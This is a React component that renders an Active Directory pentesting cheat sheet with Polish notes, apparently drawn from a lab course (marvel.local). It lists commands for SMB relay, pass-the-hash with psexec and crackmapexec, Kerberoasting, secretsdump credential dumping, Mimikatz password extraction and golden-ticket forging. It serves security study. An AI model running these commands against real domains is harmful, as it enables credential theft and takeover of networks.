import ad_ntlmv_linux  from '../../assets/ad_ntlmv_linux.png';
import ad_cred_enum  from '../../assets/ad_cred_enum.png';
import ad_cred_enum_win  from '../../assets/ad_cred_enum_win.png';
import ad_kerb_manual  from '../../assets/ad_kerb_manual.png';
import ad_kerb_auto  from '../../assets/ad_kerb_auto.png';
import ad_ntlmrelayx  from '../../assets/ad_ntlmrelayx.png';
import ad_ntlmrelayx_shell  from '../../assets/ad_ntlmrelayx_shell.png';
import ad_pv_getDomain  from '../../assets/ad_pv_getDomain.png';
import ad_pv_domainPolicy  from '../../assets/ad_pv_domainPolicy.png';
import ad_netUser  from '../../assets/ad_netUser.png';
import ad_pv_getNetDomainController  from '../../assets/ad_pv_getNetDomainController.png';
import ad_pv_netComputer  from '../../assets/ad_pv_netComputer.png';
import ad_pv_netGroup  from '../../assets/ad_pv_netGroup.png';
import ad_pv_netGroupMember  from '../../assets/ad_pv_netGroupMember.png';
import ad_crackmapexec  from '../../assets/ad_crackmapexec.png';
import ad_crackmapexec_hash from '../../assets/ad_crackmapexec_hash.png';
import ad_secretdump from '../../assets/ad_secretdump.png';
import psexec_hash from '../../assets/psexec_hash.png';
import getUserSPNs_kerberos from '../../assets/getUserSPNs_kerberos.png';
import mimikatz_golde_ticket from '../../assets/mimikatz_golde_ticket.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const AD = () => {
    return(
        <section>
            <h1>AD</h1>
            <h2>LLMNR/NBT-NS Poisoning</h2>
            <ExampleFrame screen={ad_ntlmv_linux} />

            <hr/>
            <h2>SMB Relay</h2>
            <div className='waring'>
                <p>targets.txt przykład</p>
                <p>127.41.21.5</p>
            </div>
            <ExampleFrame screen={ad_ntlmrelayx} />
            <ExampleFrame screen={ad_ntlmrelayx_shell}/>
            <div className='waring'>
                <p><span>use ADMIN</span></p>
            </div>
            
            <hr/>

            <div className='waring'>
                <p>wmiexec.py {`<Attack domain>`}/{`<user`}:{`<password>`}@{`ip`}</p>
                <p>wmiexec.py marvel.local/user:password123@192.168.57.141</p>
                <br/>
                <p>psexec.py {`<Attack domain>`}/{`<user`}:{`<password>`}@{`ip`}</p>
                <p>psexec.py marvel.local/user:password123@192.168.57.141</p>
                <br />
                <p>psexec.py {`<Attack domain>`}/{`<user`}:@{`ip`} -hashes {'<HASH>'}</p>
            </div>

            <ExampleFrame screen={psexec_hash} />

            <hr />
            <h2>Credentialed Enumeration - Linux</h2>
            <ExampleFrame screen={ad_cred_enum} />

            <div className='waring'>
                <p>crackmapexec smb {'<IP> np: 123.123.123.0/23'} -u user -p Password -d {`<Domena np: MARVEL>`}</p>
            </div>
            <ExampleFrame screen={ad_crackmapexec} />

            <div className='waring'>
                <p>crackmapexec smb {'<IP> np: 123.123.123.0/23'} -u user -H {`<HASH>`} -d {`<Domena np: MARVEL>`} --local</p>
                <p>crackmapexec smb {'<IP> np: 123.123.123.0/23'} -u user -H {`<HASH>`} -d {`<Domena np: MARVEL>`} --local-auth</p>
            </div>
            <ExampleFrame screen={ad_crackmapexec_hash} />

            <hr />
            <h2>GetUserSPNs.py</h2>
            <div className='waring'>
                <p>GetUserSPNs.py marvel.local/fcastle:Password -dc-ip 123.123.123.123 -request</p>
            </div>

            <ExampleFrame screen={getUserSPNs_kerberos} />

            <hr />

            <h2>secretsdump.py</h2>
            <div className='waring'>
                <p>secretsdump.py marvel/fcastle:Password1@123.123.123.123</p>
            </div>
            <ExampleFrame screen={ad_secretdump} />

            <hr />
            <h2>Credentialed Enumeration - Windows</h2>
            <ExampleFrame screen={ad_cred_enum_win} />

            <hr />
            <h2>PowerView.ps1 </h2>
            <p className='important'>Get-NetDomain</p>
            <ExampleFrame screen={ad_pv_getDomain} />
            <p className='important'>Get-NetDomainController</p>
            <ExampleFrame screen={ad_pv_getNetDomainController} />
            <p className='important'>Get-DomainPolicy</p>
            <ExampleFrame screen={ad_pv_domainPolicy} />
            <p className='important'>Get-NetUser</p>
            <p className='important'>Get-NetUser | select samaccountname</p>
            <p className='important'>Get-NetUser -Properties logoncount {`<-`} interesujące mogą być konta z 0 logowań (mogą być podatne na ataki)</p>
            <ExampleFrame screen={ad_netUser} />
            <p className='important'>Get-NetComputer</p>
            <ExampleFrame screen={ad_pv_netComputer} />
            <p className='important'>Get-NetGroup</p>
            <p className='important'>Get-NetGroup - GroupName *admin*</p>
            <ExampleFrame screen={ad_pv_netGroup} />
            <ExampleFrame screen={ad_pv_netGroupMember} />

            <hr />
            <h2>Mimikatz</h2>
            <div className='waring'>
                <p>privilege::debug</p>
            </div>
            <div className='waring'>
                <p>sekurlsa::logonpasswords</p>
            </div>

            <h3>Golden ticket</h3>
            <div className='waring'>
                <p>lsadump::lsa /inject /name:{'<USER_NAME>'}</p>
            </div>

            <ExampleFrame screen={mimikatz_golde_ticket} />
            <div className='waring'>
                <p>kerberos::golden /User:Administrator /domain:{`<Domena`} /sid:{`USER_SID`} /{`USER`}:{`NTML`} /id:500{'<- (admin id)'} /ptt</p>
                <br />
                <p>misc::cmd</p>
                <p>Zostajemy zalogowani na wskazanego usera</p>
            </div>

            <hr />
            <h2>Kerberos</h2>
            <h3>Manual</h3>
            <ExampleFrame screen={ad_kerb_manual} />
            <h3>Automate</h3>
            <ExampleFrame screen={ad_kerb_auto} />
        </section>
    )
}

export default AD;